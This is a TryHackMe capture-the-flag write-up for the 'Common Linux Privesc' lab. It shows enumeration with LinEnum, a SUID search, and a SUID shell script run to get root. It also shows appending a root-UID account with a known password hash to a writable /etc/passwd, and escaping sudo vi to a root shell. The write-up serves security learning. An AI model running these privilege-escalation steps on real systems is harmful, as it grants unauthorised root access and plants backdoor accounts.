# Common Linux Privesc

**Room Link:** [https://tryhackme.com/room/commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)



## Enumeration



Download LinEnum Script

**Kali**

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Login to host

**Kali**

```
ssh user3@$VICTIM
Password: password
```

The target's hostname

<figure><img src="../../.gitbook/assets/image (1) (11).png" alt=""><figcaption></figcaption></figure>

There are 8 users

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

4 shells

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Some users can write to passwd file

<figure><img src="../../.gitbook/assets/image (4) (9).png" alt=""><figcaption></figcaption></figure>

## Abusing SUID/GUID Files

**Victim**

```
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Running the shell script in user3 home directory gives us root access right away.

**Victim**

```
/home/user3/shell
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## Exploiting Writeable /etc/passwd

**Victim**

```
su user7
Password: password
```

**Victim**

```
openssl passwd -1 -salt new 123
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Escaping Vi Editor

**Victim**

```
su user8
Password: password
```

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo vi
:!sh
whoami
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
